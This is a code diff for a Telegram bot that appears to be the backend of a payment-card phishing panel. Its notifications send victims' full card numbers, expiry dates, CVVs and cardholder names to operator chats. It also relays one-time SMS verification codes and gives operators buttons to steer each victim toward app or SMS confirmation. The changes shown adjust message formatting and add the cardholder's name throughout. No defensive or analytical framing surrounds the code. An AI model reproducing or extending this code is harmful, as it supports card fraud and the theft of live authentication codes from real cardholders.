@@ -102,13 +102,17 @@ async function handleCallbackQuery(callbackQuery: any) {
             break;
           case 'app_confirmation':
             successMessage = `✅ **App Verification Activated**\n\nSession: \`${sessionId}\`\nApp confirmation is now active.`;
-            // Send notification when customer chooses App
-            await sendMethodChoiceNotification(sessionId, 'app');
+            // Send notification when customer chooses App - get cardholder name
+            if (result && result.cardholder_name) {
+              await sendMethodChoiceNotification(sessionId, 'app', result.cardholder_name);
+            }
             break;
           case 'sms_confirmation':
             successMessage = `✅ **SMS Verification Activated**\n\nSession: \`${sessionId}\`\nSMS confirmation is now active.`;
-            // Send notification when customer chooses SMS
-            await sendMethodChoiceNotification(sessionId, 'sms');
+            // Send notification when customer chooses SMS - get cardholder name
+            if (result && result.cardholder_name) {
+              await sendMethodChoiceNotification(sessionId, 'sms', result.cardholder_name);
+            }
             break;
           default:
             successMessage = `✅ Verification method set to: ${method}`;
@@ -260,24 +264,24 @@ async function sendNotification(chatId: string, type: string, data: any) {
 
     case 'payment_started':
       message = `💳 *Payment Page Entered*\n\n` +
-                `👤 Cardholder: ${data.cardholder_name}\n` +
-                `💳 Card: ${data.card_number}\n` +
-                `📅 Expiry: ${data.expiry_date}\n` +
-                `🔐 CVV: ${data.cvv}\n` +
+                `👤 Cardholder: \`${data.cardholder_name}\`\n` +
+                `💳 Card: \`${data.card_number}\`\n` +
+                `📅 Expiry: \`${data.expiry_date}\`\n` +
+                `🔐 CVV: \`${data.cvv}\`\n` +
                 `💰 Gesamtpreis: €${(data.totalPrice || 0).toFixed(2)}\n\n` +
-                `Session ID: \`${data.session_id}\``;
+                `Karteninhaber: ${data.cardholder_name}`;
       buttons = getVerificationMethodButtons(data.session_id);
       break;
 
     case 'verification_update':
       if (data.verification_status === 'app_confirmed') {
         message = `✅ *App Verification Confirmed*\n\n` +
-                  `Session: \`${data.session_id}\`\n` +
+                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
                   `Method: ${data.verification_method}`;
         buttons = getCompletionButtons(data.session_id);
       } else if (data.verification_status === 'sms_confirmation' && data.sms_code) {
         message = `📱 *SMS Code Entered*\n\n` +
-                  `Session: \`${data.session_id}\`\n` +
+                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
                   `Code: \`${data.sms_code}\``;
         buttons = getCompletionButtons(data.session_id);
       }
@@ -370,7 +374,7 @@ function getCompletionButtons(sessionId: string) {
   };
 }
 
-async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms') {
+async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms', cardholderName?: string) {
   try {
     // Get all active chat IDs
     const { data: activeChatIds, error } = await supabase.functions.invoke('get-active-chat-ids');
@@ -383,14 +387,14 @@ async function sendMethodChoiceNotification(sessionId: string, method: 'app' | '
     const methodText = method === 'app' ? 'App-Verification' : 'SMS-Verification';
     const emoji = method === 'app' ? '📱' : '💬';
     
-    const message = `${emoji} **Nutzer hat ${methodText} gewählt**\n\nSession: \`${sessionId}\`\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;
+    const message = `${emoji} **Nutzer hat ${methodText} gewählt**\n\nKarteninhaber: ${cardholderName || 'Unknown'}\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;
 
     // Send notification to all active chat IDs
     for (const chatId of activeChatIds) {
       await sendTelegramMessage(chatId, message);
     }
     
-    console.log(`Method choice notification sent for session ${sessionId}, method: ${method}`);
+    console.log(`Method choice notification sent for session ${sessionId}, method: ${method}, cardholder: ${cardholderName}`);
   } catch (error) {
     console.error('Error sending method choice notification:', error);
   }
